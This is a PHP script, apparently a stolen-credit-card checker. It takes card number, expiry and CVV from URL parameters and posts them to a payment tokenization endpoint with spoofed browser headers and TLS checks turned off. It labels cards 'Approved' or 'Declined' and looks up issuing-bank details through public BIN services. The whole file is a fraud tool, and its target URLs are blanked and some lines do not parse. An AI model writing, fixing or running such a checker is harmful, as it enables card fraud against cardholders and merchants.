<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$list = str_replace(" " , "", $list);
$separate = explode("|", $list);
$cc = $separate[0];
$mes = $separate[1];
$ano = $separate[2];
$cvv = $separate[3];

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividend,$divisor)
{
return round($dividend - (floor($dividend/$divisor)*$divisor));
}



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, .'');
curl_setopt($ch, CURLOPT_COOKIEJAR, .'');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: ',
'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Referer: ',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
$resp = curl_exec($ch);
$token = trim(strip_tags(getstr($resp,'id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: ',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
'Accept: application/json, text/plain, */*',
'Accept-Language: en-US,pt;q=0.8,en-US;q=0.5,en;q=0.3',
'Accept-Encoding: gzip, deflate, br',
'Content-Type: application/json;charset=utf-8',
'X-Session-ID: ',
'Referer: ',
'Origin: ',
'Connection: keep-alive'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'');
curl_setopt($ch, CURLOPT_COOKIEJAR, .'');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$resp = curl_exec($ch);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "fa fa-cc-mastercard";
}else if($cbin == "4"){
$cbin = "fa fa-cc-visa";
}
$debitouu = "2";

 if (strpos($resp, 'Your card was declined.')) {
 echo 'Declined';
  }else if (strpos($resp, 'cvv')){
    $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
 echo 'Approved';
  }
curl_close($ch);
ob_flush();
echo $resp;
?>
